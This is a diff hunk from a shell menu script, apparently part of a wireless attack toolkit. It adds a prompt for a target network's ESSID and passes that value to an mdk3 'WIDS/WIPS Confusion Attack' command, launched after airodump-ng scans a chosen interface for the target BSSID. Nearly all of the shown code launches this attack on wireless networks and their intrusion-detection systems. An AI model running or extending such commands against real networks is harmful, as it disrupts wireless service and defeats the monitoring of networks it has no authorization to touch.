@@ -100,7 +100,8 @@ case "$option" in
                  read -p "Enter Interface Name>: " i
                  gnome-terminal -- airodump-ng  $i
                  read -p "Enter Bssid Of Target Network>: " bssid
-                 xterm -hold -T "WIDS/WIPS Confusion Attack(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i w -t $bssid"
+                 read -p "Enter essid Of Target Network>: " ssid
+                 xterm -hold -T "WIDS/WIPS Confusion Attack(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i w -t $bssid -e $ssid"
                  echo "Attack Is Running./././././././"
                  ;; 
                  
